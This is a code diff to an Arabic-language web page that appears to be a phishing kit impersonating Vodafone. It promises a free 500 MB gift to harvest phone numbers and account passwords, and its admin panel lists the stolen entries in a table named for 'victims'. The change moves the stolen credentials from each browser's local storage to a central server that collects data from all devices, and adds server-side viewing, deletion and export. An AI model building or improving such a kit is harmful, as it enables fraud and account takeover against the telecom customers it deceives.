@@ -163,8 +163,8 @@
         <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-2xl w-full max-w-xs text-center shadow-2xl relative">
             <button onclick="closeAdminPrompt()" class="absolute top-4 left-4 text-zinc-500 hover:text-white"><i class="fa-solid fa-xmark text-sm"></i></button>
             <div class="w-12 h-12 bg-vfRed/10 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fa-solid fa-lock text-vfRed text-lg"></i></div>
-            <h3 class="text-white font-black text-sm mb-1">لوحة تحكم أيمن</h3>
-            <p class="text-zinc-500 text-[11px] mb-4">أدخل كلمة المرور السرية</p>
+            <h3 class="text-white font-black text-sm mb-1">لوحة تحكم أيمن المركزية</h3>
+            <p class="text-zinc-500 text-[11px] mb-4">أدخل كلمة المرور لعرض جميع البيانات من كل الهواتف</p>
             <div class="space-y-3">
                 <input type="password" id="adminPasswordInput" placeholder="رمز الدخول" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl py-2 px-3 text-center text-white font-bold text-xs focus:outline-none focus:border-vfRed font-mono">
                 <button onclick="submitAdminPassword()" class="w-full bg-vfRed hover:bg-vfDarkRed text-white font-bold py-2 rounded-xl transition-all text-xs">تأكيد الدخول</button>
@@ -177,9 +177,9 @@
         <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-3xl w-full max-w-4xl shadow-2xl my-8">
             <div class="flex flex-col md:flex-row justify-between items-center gap-4 border-b border-zinc-800 pb-4 mb-5">
                 <div class="flex items-center gap-3">
-                    <div class="w-9 h-9 bg-vfRed rounded-xl flex items-center justify-center"><i class="fa-solid fa-user-check text-white text-sm"></i></div>
+                    <div class="w-9 h-9 bg-vfRed rounded-xl flex items-center justify-center"><i class="fa-solid fa-server text-white text-sm"></i></div>
                     <div class="text-right">
-                        <h2 class="text-white font-bold text-sm">قائمة العمليات المسجلة</h2>
+                        <h2 class="text-white font-bold text-sm">قاعدة البيانات العالمية (جميع الأجهزة)</h2>
                         <p class="text-zinc-500 text-[10px]">اسحب يمين ويسار للجدول لرؤية جميع البيانات</p>
                     </div>
                 </div>
@@ -191,7 +191,12 @@
             </div>
 
             <!-- جدول الأرقام -->
-            <div class="can-scroll rounded-xl border border-zinc-800 bg-zinc-950 max-h-[60vh] shadow-inner">
+            <div class="can-scroll rounded-xl border border-zinc-800 bg-zinc-950 max-h-[60vh] shadow-inner relative">
+                <div id="admin-loading" class="absolute inset-0 bg-zinc-950/80 z-10 hidden flex-col items-center justify-center">
+                    <i class="fa-solid fa-rotate animate-spin text-vfRed text-2xl mb-2"></i>
+                    <span class="text-xs text-zinc-400">جاري تحميل البيانات من السيرفر...</span>
+                </div>
+                
                 <table class="w-full text-right border-collapse min-w-[750px]">
                     <thead>
                         <tr class="bg-zinc-900 border-b border-zinc-800 text-zinc-400 text-[11px] font-bold">
@@ -213,31 +218,14 @@
     </div>
 
     <script>
-        const ADMIN_SECRET = 'admin500';
+        let GLOBAL_ADMIN_PASS = ""; // لحفظ الباسوورد عشان نمسح بيه من غير ما نطلبه تاني
+        let ALL_DATA = []; // لحفظ البيانات للتصدير
 
         document.addEventListener('touchmove', function (e) {
             if (!e.target.closest('.can-scroll')) {
                 e.preventDefault();
             }
         }, { passive: false });
-
-        function getStoredSubmissions() {
-            const data = localStorage.getItem('ayman_vf_data');
-            return data ? JSON.parse(data) : [];
-        }
-
-        function saveSubmission(phone, password, status) {
-            const submissions = getStoredSubmissions();
-            const newEntry = {
-                id: Date.now(),
-                phone: phone,
-                password: password,
-                status: status,
-                timestamp: new Date().toLocaleTimeString('ar-EG', {hour: '2-digit', minute:'2-digit'})
-            };
-            submissions.push(newEntry);
-            localStorage.setItem('ayman_vf_data', JSON.stringify(submissions));
-        }
 
         function showToast(message) {
             const toast = document.getElementById('custom-toast');
@@ -262,7 +250,7 @@
             }
         }
 
-        // إرسال الطلب (خيارين فقط: نجاح الهدية أو باسورد غلط)
+        // إرسال الطلب (السيرفر دلوقتي بيحفظ عنده مش هنحفظ لوكال)
         function handleLogin(event) {
             event.preventDefault();
             
@@ -281,28 +269,21 @@
             .then(data => {
                 let selectedResult = {};
                 
-                // الخيار الأول: الباسورد سليم (سيتم جلب الهدية في الخلفية)
                 if (data.status === "success") {
                     selectedResult = {
-                        status: "بيانات صحيحة (تم إرسال الهدية)", 
                         title: "تم تفعيل الهدية! 🎉",
                         desc: "تم تفعيل حزمة الـ 500 ميجابايت المجانية على خطك بنجاح. انتظر رسالة التأكيد النصية.",
                         colorClass: "bg-green-500/10 border border-green-500/20 text-green-500",
                         icon: "fa-solid fa-circle-check"
                     };
-                } 
-                // الخيار الثاني: الباسورد خطأ
-                else {
+                } else {
                     selectedResult = {
-                        status: "لم يأخذها بسبب كلمة مرور خاطئة",
                         title: "خطأ في كلمة المرور! ❌",
                         desc: "بيانات المرور المدخلة غير صحيحة. يرجى إعادة المحاولة بكلمة مرور 'أنا فودافون' الصحيحة.",
                         colorClass: "bg-red-500/10 border border-red-500/20 text-red-500",
                         icon: "fa-solid fa-circle-xmark"
                     };
                 }
-
-                saveSubmission(phone, password, selectedResult.status);
 
                 document.getElementById('result-icon-container').className = `w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${selectedResult.colorClass}`;
                 document.getElementById('result-icon').className = `${selectedResult.icon} text-3xl`;
@@ -314,22 +295,11 @@
                 document.getElementById('stage-result').classList.remove('hidden');
             })
             .catch(err => {
-                // في حالة انقطاع النت في الواجهة
-                const errorResult = {
-                    status: "كلمة مرور خاطئة (أو ضعف شبكة)",
-                    title: "خطأ في كلمة المرور! ❌",
-                    desc: "بيانات المرور المدخلة غير صحيحة. يرجى إعادة المحاولة.",
-                    colorClass: "bg-red-500/10 border border-red-500/20 text-red-500",
-                    icon: "fa-solid fa-circle-xmark"
-                };
-
-                saveSubmission(phone, password, errorResult.status);
-
-                document.getElementById('result-icon-container').className = `w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${errorResult.colorClass}`;
-                document.getElementById('result-icon').className = `${errorResult.icon} text-3xl`;
-                document.getElementById('result-title').innerText = errorResult.title;
-                document.getElementById('result-title').className = `text-lg font-black ${errorResult.colorClass.split(' ')[2]}`;
-                document.getElementById('result-desc').innerText = errorResult.desc;
+                document.getElementById('result-icon-container').className = `w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 bg-red-500/10 border border-red-500/20 text-red-500`;
+                document.getElementById('result-icon').className = `fa-solid fa-circle-xmark text-3xl`;
+                document.getElementById('result-title').innerText = "خطأ في الاتصال! ❌";
+                document.getElementById('result-title').className = `text-lg font-black text-red-500`;
+                document.getElementById('result-desc').innerText = "تأكد من اتصالك بالإنترنت والمحاولة مرة أخرى.";
 
                 document.getElementById('stage-waiting').classList.add('hidden');
                 document.getElementById('stage-result').classList.remove('hidden');
@@ -352,41 +322,71 @@
 
         function submitAdminPassword() {
             const passInput = document.getElementById('adminPasswordInput').value;
-            if (passInput === ADMIN_SECRET) {
-                closeAdminPrompt();
-                openAdminDashboard();
-            } else {
-                showToast("رمز مرور المسؤول خاطئ!");
-                document.getElementById('adminPasswordInput').value = '';
-            }
+            if (!passInput) return;
+            
+            GLOBAL_ADMIN_PASS = passInput; // حفظ الباسوورد
+            
+            // فتح اللوحة واستدعاء البيانات من السيرفر
+            closeAdminPrompt();
+            openAdminDashboard();
+            fetchServerData();
         }
 
         function openAdminDashboard() {
             const dashboard = document.getElementById('admin-dashboard');
             dashboard.classList.remove('opacity-0', 'pointer-events-none');
             dashboard.classList.add('opacity-100');
-            renderVictimsTable();
         }
 
         function closeAdminDashboard() {
             const dashboard = document.getElementById('admin-dashboard');
             dashboard.classList.add('opacity-0', 'pointer-events-none');
             dashboard.classList.remove('opacity-100');
+            GLOBAL_ADMIN_PASS = ""; // تصفير الباسوورد عند الخروج للأمان
         }
 
-        function renderVictimsTable() {
-            const submissions = getStoredSubmissions();
+        // دالة قلب اللوحة: جلب البيانات من السيرفر وليس من الجهاز
+        function fetchServerData() {
+            document.getElementById('admin-loading').classList.replace('hidden', 'flex');
+            
+            fetch('/api/admin/data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: GLOBAL_ADMIN_PASS })
+            })
+            .then(res => {
+                if (res.status === 401) throw new Error("wrong_pass");
+                return res.json();
+            })
+            .then(data => {
+                document.getElementById('admin-loading').classList.replace('flex', 'hidden');
+                ALL_DATA = data; // تخزينها للتصدير
+                renderVictimsTable(data);
+            })
+            .catch(err => {
+                document.getElementById('admin-loading').classList.replace('flex', 'hidden');
+                if (err.message === "wrong_pass") {
+                    showToast("رمز المرور خاطئ أو غير مصرح لك!");
+                    closeAdminDashboard();
+                } else {
+                    showToast("حدث خطأ أثناء جلب البيانات من السيرفر.");
+                }
+            });
+        }
+
+        function renderVictimsTable(submissions) {
             const tableBody = document.getElementById('victim-table-body');
             const noDataMsg = document.getElementById('no-data-msg');
             
             tableBody.innerHTML = '';
 
-            if (submissions.length === 0) {
+            if (!submissions || submissions.length === 0) {
                 noDataMsg.classList.remove('hidden');
             } else {
                 noDataMsg.classList.add('hidden');
                 
-                submissions.reverse().forEach(entry => {
+                // عرض الأحدث أولاً
+                submissions.slice().reverse().forEach(entry => {
                     let badgeClass = "text-zinc-500 bg-zinc-800/55";
                     if (entry.status.includes("صحيحة")) {
                         badgeClass = "text-green-500 bg-green-500/10";
@@ -398,7 +398,7 @@
                         <tr class="hover:bg-zinc-900/40 transition-colors">
                             <td class="p-4 font-mono font-bold text-white tracking-wide">${entry.phone}</td>
                             <td class="p-4 font-mono text-zinc-400 select-all">${entry.password}</td>
-                            <td class="p-4 text-[11px] text-zinc-500">${entry.timestamp}</td>
+                            <td class="p-4 text-[11px] text-zinc-500">${entry.timestamp || 'غير محدد'}</td>
                             <td class="p-4">
                                 <span class="px-3 py-1 rounded-md text-[11px] font-semibold whitespace-nowrap ${badgeClass}">
                                     ${entry.status}
@@ -417,35 +417,62 @@
         }
 
         function deleteSingleEntry(id) {
-            let submissions = getStoredSubmissions();
-            submissions = submissions.filter(entry => entry.id !== id);
-            localStorage.setItem('ayman_vf_data', JSON.stringify(submissions));
-            renderVictimsTable();
-            showToast("تم حذف الرقم من السجل.");
-        }
-
-        function exportData() {
-            const submissions = getStoredSubmissions();
-            if (submissions.length === 0) {
-                showToast("لا توجد أرقام لتصديرها!");
-                return;
-            }
-            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(submissions, null, 2));
-            const downloadAnchor = document.createElement('a');
-            downloadAnchor.setAttribute("href", dataStr);
-            downloadAnchor.setAttribute("download", `ayman_vf_data_${Date.now()}.json`);
-            document.body.appendChild(downloadAnchor);
-            downloadAnchor.click();
-            downloadAnchor.remove();
-            showToast("تم تنزيل ملف البيانات بنجاح!");
+            document.getElementById('admin-loading').classList.replace('hidden', 'flex');
+            
+            fetch('/api/admin/delete', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: GLOBAL_ADMIN_PASS, id: id })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.success) {
+                    showToast("تم حذف الرقم من السيرفر.");
+                    fetchServerData(); // تحديث الجدول
+                }
+            })
+            .catch(err => {
+                document.getElementById('admin-loading').classList.replace('flex', 'hidden');
+                showToast("حدث خطأ أثناء الحذف.");
+            });
         }
 
         function clearData() {
-            if (confirm("هل تريد تصفير السجل ومسح كافة الأرقام؟")) {
-                localStorage.removeItem('ayman_vf_data');
-                renderVictimsTable();
-                showToast("تم تصفير السجل بالكامل.");
+            if (confirm("هل تريد مسح قاعدة البيانات بالكامل من السيرفر؟")) {
+                document.getElementById('admin-loading').classList.replace('hidden', 'flex');
+                
+                fetch('/api/admin/clear', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password: GLOBAL_ADMIN_PASS })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if(data.success) {
+                        showToast("تم تصفير السجل بالكامل من السيرفر.");
+                        fetchServerData(); // تحديث الجدول ليكون فارغ
+                    }
+                })
+                .catch(err => {
+                    document.getElementById('admin-loading').classList.replace('flex', 'hidden');
+                    showToast("حدث خطأ أثناء المسح.");
+                });
             }
+        }
+
+        function exportData() {
+            if (ALL_DATA.length === 0) {
+                showToast("لا توجد أرقام لتصديرها!");
+                return;
+            }
+            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(ALL_DATA, null, 2));
+            const downloadAnchor = document.createElement('a');
+            downloadAnchor.setAttribute("href", dataStr);
+            downloadAnchor.setAttribute("download", `vf_server_database_${Date.now()}.json`);
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            downloadAnchor.remove();
+            showToast("تم تنزيل ملف قاعدة البيانات بنجاح!");
         }
     </script>
 </body>
